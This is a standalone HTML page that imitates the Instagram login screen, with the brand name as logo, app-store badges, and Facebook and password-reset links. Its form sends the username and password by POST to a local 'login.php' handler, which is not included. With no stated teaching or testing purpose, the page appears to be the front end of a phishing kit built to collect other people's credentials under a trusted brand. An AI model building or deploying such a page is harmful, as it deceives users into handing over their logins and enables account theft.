<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  box-sizing:border-box;
  font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body{
  margin:0;
  background:#000;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}

.wrapper{
  width:100%;
  max-width:360px;
}

.card{
  border:1px solid #262626;
  padding:30px 25px;
  text-align:center;
}

.logo{
  font-family:cursive;
  font-size:36px;
  margin-bottom:30px;
}

input{
  width:100%;
  padding:12px 10px;
  margin-bottom:10px;
  background:#000;
  border:1px solid #262626;
  color:#fff;
  border-radius:4px;
}

input::placeholder{
  color:#8e8e8e;
}

button{
  width:100%;
  padding:10px;
  background:#0095f6;
  border:none;
  border-radius:8px;
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

button:disabled{
  background:#1a3c57;
}

.or{
  display:flex;
  align-items:center;
  gap:15px;
  margin:20px 0;
  color:#8e8e8e;
  font-size:13px;
}

.or::before,
.or::after{
  content:"";
  flex:1;
  height:1px;
  background:#262626;
}

.fb{
  color:#0095f6;
  font-size:14px;
  margin-bottom:15px;
}

.forgot{
  font-size:12px;
  color:#e0f1ff;
}

.signup{
  margin-top:15px;
  border:1px solid #262626;
  padding:15px;
  text-align:center;
  font-size:14px;
}

.signup span{
  color:#0095f6;
}

.getapp{
  text-align:center;
  margin-top:20px;
  font-size:14px;
}

.stores{
  display:flex;
  justify-content:center;
  gap:10px;
  margin-top:10px;
}

.stores img{
  height:40px;
}
</style>
</head>

<body>
<div class="wrapper">

  <div class="card">
    <div class="logo">Instagram</div>

    <form action="login.php" method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>

    <div class="or">OR</div>

    <div class="fb">Log in with Facebook</div>
    <div class="forgot">Forgot password?</div>
  </div>

  <div class="signup">
    Don't have an account? <span>Sign up</span>
  </div>

  <div class="getapp">
    Get the app.
    <div class="stores">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Microsoft_Store_badge.svg">
    </div>
  </div>

</div>
</body>
</html>
